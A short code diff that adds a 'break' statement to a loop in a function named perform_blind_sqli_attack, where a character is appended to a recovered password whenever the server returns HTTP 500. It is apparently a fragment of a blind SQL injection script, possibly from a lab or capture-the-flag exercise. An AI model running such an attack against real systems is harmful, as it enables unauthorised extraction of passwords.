@@ -41,6 +41,7 @@ def perform_blind_sqli_attack():
         
             if response.status_code == 500:
                 password += c
+                break
 
 
         
